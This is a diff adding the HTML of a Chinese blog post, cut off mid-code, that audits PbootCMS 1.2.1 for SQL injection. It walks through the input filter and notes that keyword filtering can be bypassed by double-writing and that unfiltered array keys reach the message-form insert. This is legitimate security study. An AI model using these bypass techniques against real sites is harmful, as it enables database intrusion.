@@ -1,0 +1,1190 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="R0ser1">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="R0ser1">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="前言本文学习的是PbootCMS_V1.2.1版本代码审计，采用的是MVC框架的设计。也是爆了一些洞，在前辈们的基础上学习，看还能不能发现一些有意思的东西。 环境部署部署CMSPbootCMS部署是很方便的,直接下载下来即可使用,但是系统默认使用sqlite的,因为用mysql用的比较多,那这里我就以mysql数据库安装来跑程序。在config\database.php 然后创建自己的数据库，导入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PbootCMS1.2.1代码审计学习">
+<meta property="og:url" content="http://example.com/2021/08/09/PbootCMS1-2-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言本文学习的是PbootCMS_V1.2.1版本代码审计，采用的是MVC框架的设计。也是爆了一些洞，在前辈们的基础上学习，看还能不能发现一些有意思的东西。 环境部署部署CMSPbootCMS部署是很方便的,直接下载下来即可使用,但是系统默认使用sqlite的,因为用mysql用的比较多,那这里我就以mysql数据库安装来跑程序。在config\database.php 然后创建自己的数据库，导入">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9d4p9fp8j60u40e678702.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt9t72dueoj60wt0n9h1202.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9t7919xoj311r0gzaix.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9t7e8vwgj30rz098n29.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt9t7k8ie1j30x708mwjn.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9t7t6jeyj30te07x43s.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt9t80ebxgj30tx05sdjc.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt9t85jp7xj31340lkdv7.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt9t8ceyyfj30yf06j0xs.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9t8hfmt4j30vi05bq64.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt9t8ndcf1j31f80kcwpb.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt9t8u94voj30q5068q5t.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt9t8zgl5yj31c80m04m7.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9t974embj31a50fon9f.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gt9t9cwc6xj30vs0d6wj4.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt9t9ibflzj31e60butno.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt9t9oq4atj31dp0fwwnm.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9t9vh92lj30pg08vn2m.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt9ta33ix0j316m0idds9.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt9ta94pq3j60xy0hkgus02.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/00774lbQly1gt9taev4q0j60xy0ht7cq02.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt9takh2uvj31400i4wud.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gt9taqfi1nj31el0f2tf5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt9tavrss1j31eu0jxamm.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/00774lbQly1gt9tb0vbj2j312108sgvu.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gt9tb762swj30u10ddqb5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/00774lbQly1gt9tbcu5g9j310n07e46v.jpg">
+<meta property="article:published_time" content="2021-08-09T00:51:00.000Z">
+<meta property="article:modified_time" content="2021-08-09T01:01:32.566Z">
+<meta property="article:author" content="R0ser1">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt9d4p9fp8j60u40e678702.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>PbootCMS1.2.1代码审计学习 · R0ser1&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20210204" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20210204" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "https://tva2.sinaimg.cn/large/00774lbQly1gsk7gp4qw1j30qo0qojtw.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js?v=20210204" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <script src="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/js/all.min.js"  data-auto-replace-svg="nest" ></script>
+    
+    <!-- fancybox -->
+    <script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <!-- top read progress line -->
+    <div class="header-element">
+        
+        <div class="read-progress"></div>
+        
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+        <div class="header-sidebar-menu">
+        
+            
+            <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- back to home page text -->
+    <a class="home-link header-element" href=/>R0ser1's Blog</a>
+    <!-- toggle banner for post layout -->
+    
+    
+    <div class="banner">
+    
+        <div class="blog-title header-element">
+            <a href="/" >R0ser1&#39;s Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">PbootCMS1.2.1代码审计学习</a>
+        </div>
+    </div>
+    
+</header>
+    
+<footer class="footer-fixed">
+
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+        <div class="back-top">
+        
+            
+            <div>&#xe639;</div>
+            
+        </div>
+    </div>
+</footer>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://tvax1.sinaimg.cn/large/00774lbQly1gsk7i9yw6zj31z413jgra.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            PbootCMS1.2.1代码审计学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.9k</span>Reading time: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/08/09</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文学习的是<strong>PbootCMS_V1.2.1</strong>版本代码审计，采用的是MVC框架的设计。也是爆了一些洞，在前辈们的基础上学习，看还能不能发现一些有意思的东西。</p>
+<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><h2 id="部署CMS"><a href="#部署CMS" class="headerlink" title="部署CMS"></a>部署CMS</h2><p>PbootCMS部署是很方便的,直接下载下来即可使用,但是系统默认使用sqlite的,因为用mysql用的比较多,那这里我就以mysql数据库安装来跑程序。在config\database.php<br><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt9d4p9fp8j60u40e678702.jpg" alt="image-20210807221610120"></p>
+<p>然后创建自己的数据库，导入/static/backup/sql/xx.sql文件即可</p>
+<h2 id="整体框架构造"><a href="#整体框架构造" class="headerlink" title="整体框架构造"></a>整体框架构造</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PbootCMS-V1.2.1</span><br><span class="line">├─ apps         应用程序</span><br><span class="line">│  ├─ admin     后台模块</span><br><span class="line">│  ├─ api       api模块</span><br><span class="line">│  ├─ common    公共模块</span><br><span class="line">│  ├─ home      前台模块</span><br><span class="line">├─ config       配置文件</span><br><span class="line">│  ├─ config.php    配置文件</span><br><span class="line">│  ├─ database.php  数据库配置文件</span><br><span class="line">│  ├─ route.php     用户自定义路由规则</span><br><span class="line">├─ core         框架核心</span><br><span class="line">│  ├─ function  框架公共函数库</span><br><span class="line">│  │  ├─ handle.php 助手函数库1</span><br><span class="line">│  │  ├─ helper.php 助手函数库2</span><br><span class="line">├─ template     html模板</span><br><span class="line">├─ admin.php    管理端入口文件</span><br><span class="line">├─ api.php      api入口文件</span><br><span class="line">├─ index.php    前端入口文件</span><br></pre></td></tr></table></figure>
+
+<p>列出一些重要目录可以快速帮助我们了接系统有3个入口文件(<code>admin.php,api.php,index.php</code>)分别对应<code>apps</code>目录下的几个模块(<code>admin,api,home</code>)</p>
+<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>这个框架可以自定义路由和普通的MVC路由</p>
+<p>自定义路由：</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt9t72dueoj60wt0n9h1202.jpg" alt="image-20210807222608674"></p>
+<p>例如我们访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.pbootcms.com&#x2F;index.php&#x2F;list&#x2F;2</span><br></pre></td></tr></table></figure>
+
+<p>经过自定义路由解析后访问的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.pbootcms.com&#x2F;home&#x2F;list&#x2F;index&#x2F;scode&#x2F;11</span><br></pre></td></tr></table></figure>
+
+<p>定位:<code>home模块list控制器index方法scode参数</code></p>
+<p>普通的MVC模式：<br>对于上面没有自定义的路由规则来说,直接按照MVC模式访问即可<br>例如我们在message控制器创建我们自定义的方法</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt9t7919xoj311r0gzaix.jpg" alt="image-20210807223243923"></p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt9t7e8vwgj30rz098n29.jpg" alt="image-20210807223158178"></p>
+<p>定位:<code>apps\home\controller\MessageController.php</code>的<code>t()</code>方法</p>
+<h2 id="系统参数过滤情况"><a href="#系统参数过滤情况" class="headerlink" title="系统参数过滤情况"></a>系统参数过滤情况</h2><p>我们审计MVC框架肯定先了解一下他自带的接收参数的函数或者过滤机制是什么。</p>
+<ul>
+<li>我们先看看原生<code>GET,POST,REQUEST</code>的接收参数过滤情况</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt9t7k8ie1j30x708mwjn.jpg" alt="image-20210807224505649"></p>
+<p>经过游览器测试没有任何的过滤直接输出</p>
+<ul>
+<li>我们现在看看系统函数<code>get,post,request,cookie</code>过滤情况:</li>
+</ul>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt9t7t6jeyj30te07x43s.jpg" alt="image-20210807224800346"></p>
+<p>发现key没有变化，Value发生了变化我们跟进代码去看一下吧</p>
+<p>这里前3个函数都会调用<code>filter()</code>进行过滤,<code>filter()</code>会调用<code>escape_string()</code>函数,<code>Cookie</code>是直接进行<code>escape_string()</code>过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#core\functionhandle.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape_string</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$dropStr</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$string</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$string</span>)) &#123; <span class="comment">// 数组处理</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>[<span class="variable">$key</span>] = escape_string(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_object(<span class="variable">$string</span>)) &#123; <span class="comment">// 对象处理</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>-&gt;<span class="variable">$key</span> = escape_string(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 字符串处理</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dropStr</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$string</span> = htmlspecialchars(trim(<span class="variable">$string</span>), ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">        <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据代码我们可以看到<br>0x1.首先这里经过了<code>preg_replace</code>正则匹配,对一些敏感词汇进行了过滤<br>0x2.<code>htmlspecialchars()</code>函数html实体编码(单双引号都过滤)<br>0x3.<code>addslashes()</code>函数转义</p>
+<p>注意:<br>这里的过滤只针对<code>value</code>而<code>key</code>完全无过滤<br>正则绕过很简单,只需要<code>双写</code>绕过就可以<br>因为这里绕过<code>html编码</code>与<code>addslashes()</code>函数而进行sql注入不现实<br>所以我们将重点放在key上面</p>
+<h2 id="了接系统DB类，数据底层操作方法"><a href="#了接系统DB类，数据底层操作方法" class="headerlink" title="了接系统DB类，数据底层操作方法"></a>了接系统DB类，数据底层操作方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#PbootCMS\core\basic\Model.php</span><br></pre></td></tr></table></figure>
+
+<p>通过读DB底层操作代码发现这里大部分都是字符串拼接,只要可以带入 <code>’</code> 即可注入。因为在value处注入不现实,现在我们把重点放在<strong>可控的数组上–&gt;寻找参数可为数组</strong>且用<code>key</code>直接拼接的操作方法</p>
+<h1 id="搜寻漏洞及其利用"><a href="#搜寻漏洞及其利用" class="headerlink" title="搜寻漏洞及其利用"></a>搜寻漏洞及其利用</h1><p>这里咱们咱们重点关注前台sql注入<br>搜索方法:<br>**0x01.**在<code>home\controller</code>中查找直接调用上述操作方法的函数—&gt;构建<code>sql</code><br>**0x02.**在<code>home\model</code>查找调用上述操作方法的函数<code>a()</code>–&gt;返回<code>home\controller</code>中再次寻找调用<code>a()</code>函数的方法—&gt;构建<code>sql</code><br>**0x03.**在公共函数库<code>apps\common</code>查找调用上述操作方法的函数<code>b()</code>–&gt;返回<code>home\controller</code>中寻找调用<code>b()</code>函数的方法—&gt;构建<code>sql</code></p>
+<h1 id="insert-注入一-留言处"><a href="#insert-注入一-留言处" class="headerlink" title="insert 注入一[留言处]"></a>insert 注入一[留言处]</h1><p>搜索<code>insert()</code>–&gt;在<code>home\model\ParserModel.php</code>找到<code>addMessage()</code>函数调用了<code>insert()</code>操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新增留言</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMessage</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_message&#x27;</span>)-&gt;autoTime()-&gt;insert(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们在搜索下<code>home\controller</code>哪里调用了<code>addMessage()</code>函数,在<code>MessageController.php</code>找到<code>add()</code>方法:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>) &#123;</span><br><span class="line">        ······</span><br><span class="line">            <span class="comment">// 接收数据</span></span><br><span class="line">            <span class="variable">$mail_body</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$form</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$field_data</span> = post(<span class="variable">$value</span>-&gt;name);</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$field_data</span>)) &#123; <span class="comment">// 如果是多选等情况时转换</span></span><br><span class="line">                <span class="variable">$field_data</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$field_data</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$value</span>-&gt;required &amp;&amp; ! <span class="variable">$field_data</span>) &#123;</span><br><span class="line">                alert_back(<span class="variable">$value</span>-&gt;description . <span class="string">&#x27;不能为空！&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$data</span>[<span class="variable">$value</span>-&gt;name] = post(<span class="variable">$value</span>-&gt;name);</span><br><span class="line">                <span class="variable">$mail_body</span> .= <span class="variable">$value</span>-&gt;description . <span class="string">&#x27;：&#x27;</span> . post(<span class="variable">$value</span>-&gt;name) . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ······</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;model-&gt;addMessage(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            ·······</span><br><span class="line">        